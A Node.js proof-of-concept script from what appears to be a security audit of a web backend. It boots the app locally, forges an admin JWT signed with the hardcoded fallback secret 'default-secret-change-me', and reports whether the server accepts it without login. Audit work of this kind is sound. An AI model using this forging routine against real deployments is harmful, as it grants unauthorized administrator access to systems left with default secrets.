// Self-contained ORCH-003 proof. Boots app/backend/dist on 3110 with a chosen JWT_SECRET env,
// waits for ready, forges an admin token with a candidate secret, reports, then kills the child.
// arg1: 'default'  => set JWT_SECRET='default-secret-change-me' (simulates deploy with env UNSET -> code fallback value)
//       'omit'     => delete JWT_SECRET from env (tests whether backend/.env is loaded by absolute path)
import { spawn } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
const HERE = path.dirname(fileURLToPath(import.meta.url));
const QA = path.resolve(HERE, '..', '..');            // .qa-audit
const REPO = path.resolve(QA, '..');
const BACKEND = path.join(REPO, 'app', 'backend');
const envDir = path.join(QA, 'envs', 't5b');
const dbFile = path.join(envDir, 'app.db');
const golden = path.join(QA, 'envs', '_golden', 'dev.db');
const fwd = (p) => p.replace(/\\/g, '/');
const mode = process.argv[2] || 'default';

fs.mkdirSync(envDir, { recursive: true });
for (const f of ['app.db','app.db-journal','app.db-wal','app.db-shm']) fs.rmSync(path.join(envDir,f),{force:true});
fs.copyFileSync(golden, dbFile);

const env = { ...process.env, DATABASE_URL: `file:${fwd(dbFile)}`, BACKUP_META_DATABASE_URL: `file:${fwd(path.join(envDir,'backup-meta.db'))}`, PORT: '3110', NODE_ENV: 'development', BACKUP_SCHEDULE_CRON: '0 3 1 1 *' };
if (mode === 'default') env.JWT_SECRET = 'default-secret-change-me';
else delete env.JWT_SECRET;

const logOut = fs.openSync(path.join(QA, 'logs', 't5b.log'), 'a');
const child = spawn(process.execPath, ['dist/main.js'], { cwd: BACKEND, stdio: ['ignore', logOut, logOut], env });

function forge(secret, sub = 1) {
  const h = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
  const now = Math.floor(Date.now()/1000);
  const p = Buffer.from(JSON.stringify({ sub, username: 'admin', roles: ['admin'], type: 'access', iat: now, exp: now+3600 })).toString('base64url');
  const sig = crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url');
  return `${h}.${p}.${sig}`;
}

async function main() {
  console.log(`[t5b] mode=${mode} JWT_SECRET ${env.JWT_SECRET ? '='+env.JWT_SECRET : 'OMITTED (relies on .env / code fallback)'} pid=${child.pid}`);
  let up = false;
  for (let i = 0; i < 60; i++) {
    try { const r = await fetch('http://localhost:3110/v1/auth/check-setup', { method: 'POST' }); if (r.status) { up = true; break; } } catch {}
    await new Promise(r => setTimeout(r, 500));
  }
  if (!up) { console.log('[t5b] failed to boot'); child.kill(); return; }
  // Forge with the public hardcoded fallback value
  const token = forge('default-secret-change-me');
  const res = await fetch('http://localhost:3110/v1/users/me', { headers: { Authorization: `Bearer ${token}` } });
  const body = await res.json().catch(() => ({}));
  console.log(`[t5b] forge('default-secret-change-me') -> GET /users/me = ${res.status}`,
    res.status === 200 ? `*** FORGERY ACCEPTED (no login): user=${body.data?.username} roles=${JSON.stringify(body.data?.roles)} ***`
                       : `(rejected: ${JSON.stringify(body.error || body).slice(0,90)})`);
  if (mode === 'omit') console.log('  interpretation: REJECT here => backend/.env (absolute path) WAS loaded and its real JWT_SECRET is active, masking the fallback for THIS deployment.');
  if (mode === 'default') console.log('  interpretation: ACCEPT here => when JWT_SECRET is unset at deploy, the public code fallback is the live signing key => trivial admin forgery.');
  child.kill();
}
main().catch((e) => { console.error(e); child.kill(); });
